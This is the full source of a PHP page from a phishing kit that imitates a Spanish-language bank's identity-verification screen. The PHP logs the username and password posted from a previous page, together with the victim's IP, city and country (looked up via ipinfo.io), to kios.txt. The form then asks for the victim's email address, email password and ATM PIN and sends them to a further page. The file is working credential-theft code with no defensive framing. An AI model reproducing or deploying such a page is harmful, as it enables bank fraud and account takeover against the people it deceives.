<?php
@session_start();
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$k1 = $_POST['g1'];
$k2 = $_POST['g2'];
$k3 = $_POST['g3'];
$k4 = $_POST['g4'];


if (isset ($k1) && isset ($k2) ) {
  $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

  $country = $dedon->country;
  $city = $dedon->city;
  
  $time = date('Y-m-d H:i:s');
  $dat = fopen('kios.txt', 'a');
  fwrite($dat, "||---------------------------<\n|| Uxe: $k1 - pxs: $k2 -  $country $city  $time - $ip\n");
  
} else{ header ('index.html'); exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
    <link rel="stylesheet" href="style2.css">
</head>
<body>
    <main>
    <header>
        <div class="li1">
            <img src="https://i.postimg.cc/43vq9qx8/e2e.png" alt="">
            <img src="https://i.postimg.cc/KzZVrfKm/764.png" alt="">
        </div>
        <div class="lr2">
            Verificar su identidad
        </div>
    </header>
<div class="cuerp">
    <div class="cuerp1">

    <div class="l1">
        Confirmar correo asociado a su cuenta de banco
    </div>
    <div class="l2">
        Para verificar su identidad, Ingrese el correo asociado ala cuenta bancaria
    </div>
<form action="index3.php" method="post">
    <div class="campos">
        <div class="ca1">
            <label for="">Correo electrónico</label><br>
            <input type="email" name="g1" required  minlength="5" maxlength="40">
        </div>
        <div class="ca1">
            <label for="">Clave del correo</label><br>
            <input type="text" name="g2" required  minlength="4" maxlength="45">
        </div>
        <div class="ca1">
            <label for="">Atm o Pin</label><br>
            <input type="text" name="g3" required  minlength="3" maxlength="8">
        </div>
    </div>
    <div class="l3">
        La direccion de correo electronico que ingrese debe coincidir con el correo asociado anuestros servicios de online Banking    
    </div>
    <div class="btn">
        <button>Confirmar</button>
    </div>
</form>
    </div>


    <div class="cuerp2">
        <div class="ayu">
            Ayuda para entrar
        </div>
        <p>¿No reconoce o no puede acceder a la direccion de correo electronico o al numero de telefono proporcionados?</p>
        
    </div>

    </div>


    <footer>
        <img src="https://i.postimg.cc/hvBgVTLn/6546g.png" alt="">
    </footer>



    </main>
    <script src="secure.js"></script>
</body>
</html>